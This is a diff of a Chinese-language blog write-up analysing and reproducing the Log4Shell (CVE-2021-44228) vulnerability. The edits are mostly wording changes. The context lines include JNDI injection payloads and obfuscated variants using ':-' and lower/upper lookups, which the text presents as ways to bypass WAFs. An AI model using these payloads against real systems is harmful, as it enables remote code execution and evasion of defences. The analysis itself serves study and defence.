@@ -161,7 +161,7 @@
         
 
         <div class="article-content markdown-body">
-            <p>去年12月份爆出了<code>log4j2 RCE</code>的漏洞（<code>CVE-2021-44228</code>），该漏洞利用难度低，危害大，且影响范围广泛，这将有可能是载入安全史册的漏洞，作为史诗级漏洞的见证者，写个漏洞分析留个底还是有必要的:smile:</p>
+            <p>去年12月份爆出了<code>log4j2 RCE</code>的漏洞（<code>CVE-2021-44228</code>），该漏洞利用难度低，危害大，且影响范围广泛，这将有可能是载入安全史册的漏洞，作为史诗级漏洞的见证者，写个漏洞分析留个底还是有必要的😀</p>
 <h2 id="0x00-漏洞复现"><a href="#0x00-漏洞复现" class="headerlink" title="0x00 漏洞复现"></a>0x00 漏洞复现</h2><p>复现比较简单，先引入<code>log4j</code> 版本<code>2.14.1</code>的包，我这里配的是<code>lombok</code>+<code>sprint-boot-starter-log4j2</code>，<code>starter 2.5.7</code>依赖的是<code>2.14.1</code>版本的log4j</p>
 <img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123122258173.png" class="" title="image-20220123122258173">
 
@@ -217,7 +217,7 @@
 <p>接着将前缀<code>$&#123;</code>后面的字符串通过while循环匹配后缀<code>&#125;</code>，在while循环中匹配后缀之前，会先判断剩下的字符串是否还存在前缀，每匹配一次前缀则<code>nestedVarCount</code>加一，当该变量不为<code>0</code>且匹配中一次后缀<code>&#125;</code>会减一，通过该变量来匹配出最外层<code>$&#123;&#125;</code>包裹的表达式，然后将匹配后的表达式继续往下递归，以满足嵌套的场景</p>
 <img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123194612458.png" class="" title="image-20220123194612458">
 
-<p>接着判断是否包含<code>:-</code>和<code>:\-</code>分割符，然后做一些分割处理（绕过思路1），这里判断较多，就不挨个描述，简单概括为</p>
+<p>接着判断是否包含<code>:-</code>和<code>:\-</code>分割符，然后做一些分割处理（变形思路1），这里判断较多，就不挨个描述，简单概括为</p>
 <ul>
 <li><code>:-</code> 是一个分割符，如果程序处理到 <code>$&#123;aaaa:-bbbb&#125;</code> 这样的字符串，处理的结果将会是 <code>bbbb</code>，<code>:-</code> 关键字将会被截取掉，而之前的字符串都会被舍弃掉。</li>
 <li><code>:\-</code> 是转义的 <code>:-</code>，如果一个用 <code>a:b</code> 表示的键值对的 key <code>a</code> 中包含 <code>:</code>，则需要使用转义来配合处理，例如 <code>$&#123;aaa:\\-bbb:-ccc&#125;</code>，代表 key 是，<code>aaa:bbb</code>，value 是 <code>ccc</code>。</li>
@@ -236,8 +236,8 @@
 <p>继续跟进<code>lookup</code>可以看到，我们传入的是jndi前缀，所以会调用<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>的<code>lookup</code>方法，到这就触发漏洞了。</p>
 <img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210252342.png" class="" title="image-20220123210252342">
 
-<h2 id="0x02-变形思路"><a href="#0x02-变形思路" class="headerlink" title="0x02 变形思路"></a>0x02 变形思路</h2><h3 id="增加-干扰"><a href="#增加-干扰" class="headerlink" title="增加:-干扰"></a>增加<code>:-</code>干扰</h3><p>上面说到当字符串种包含<code>:-</code>和<code>:\-</code>会做一些处理，我们就可以该处理逻辑来变形绕过一些waf，例如<code>$&#123;$&#123;p0melo:-j&#125;ndi:ldap://127.0.0.1:1389/kk2err&#125;</code></p>
-<h3 id="嵌套其他协议"><a href="#嵌套其他协议" class="headerlink" title="嵌套其他协议"></a>嵌套其他协议</h3><p>上面可以看到<code>StrLookup</code>除了支持jndi协议还支持<code>&#123;date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j&#125;</code>，所以我们可以通过其他协议变形payload</p>
+<h2 id="0x02-payload变形思路"><a href="#0x02-payload变形思路" class="headerlink" title="0x02 payload变形思路"></a>0x02 payload变形思路</h2><h3 id="增加-干扰"><a href="#增加-干扰" class="headerlink" title="增加:-干扰"></a>增加<code>:-</code>干扰</h3><p>上面说到当字符串种包含<code>:-</code>和<code>:\-</code>会做一些处理，我们就可以该处理逻辑来变形绕过一些waf，例如<code>$&#123;$&#123;p0melo:-j&#125;ndi:ldap://127.0.0.1:1389/kk2err&#125;</code></p>
+<h3 id="嵌套其他协议"><a href="#嵌套其他协议" class="headerlink" title="嵌套其他协议"></a>嵌套其他协议</h3><p>上面分析中可以看到<code>StrLookup</code>除了支持jndi协议还支持<code>&#123;date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j&#125;</code>，所以我们可以通过其他协议变形payload</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;lower:j&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;di:$&#123;lower::::l&#125;dap:<span class="comment">//127.0.0.1:1389/kk2err&#125; // 可以嵌套多个</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h3><p>当然我们也可以组合上面两种思路，例如</p>
@@ -452,7 +452,7 @@
         <aside class="page-aside">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">0x00 漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">0x01 代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95"><span class="nav-text">日志记录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B6%88%E6%81%AF%E6%A0%BC%E5%BC%8F%E5%8C%96"><span class="nav-text">消息格式化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2"><span class="nav-text">字符替换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lookup"><span class="nav-text">Lookup</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%8F%98%E5%BD%A2%E6%80%9D%E8%B7%AF"><span class="nav-text">0x02 变形思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A2%9E%E5%8A%A0-%E5%B9%B2%E6%89%B0"><span class="nav-text">增加:-干扰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B5%8C%E5%A5%97%E5%85%B6%E4%BB%96%E5%8D%8F%E8%AE%AE"><span class="nav-text">嵌套其他协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%84%E5%90%88"><span class="nav-text">组合</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">0x00 漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">0x01 代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95"><span class="nav-text">日志记录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B6%88%E6%81%AF%E6%A0%BC%E5%BC%8F%E5%8C%96"><span class="nav-text">消息格式化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2"><span class="nav-text">字符替换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lookup"><span class="nav-text">Lookup</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-payload%E5%8F%98%E5%BD%A2%E6%80%9D%E8%B7%AF"><span class="nav-text">0x02 payload变形思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A2%9E%E5%8A%A0-%E5%B9%B2%E6%89%B0"><span class="nav-text">增加:-干扰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B5%8C%E5%A5%97%E5%85%B6%E4%BB%96%E5%8D%8F%E8%AE%AE"><span class="nav-text">嵌套其他协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%84%E5%90%88"><span class="nav-text">组合</span></a></li></ol></li></ol>
     </div>
 </div>
         </aside>
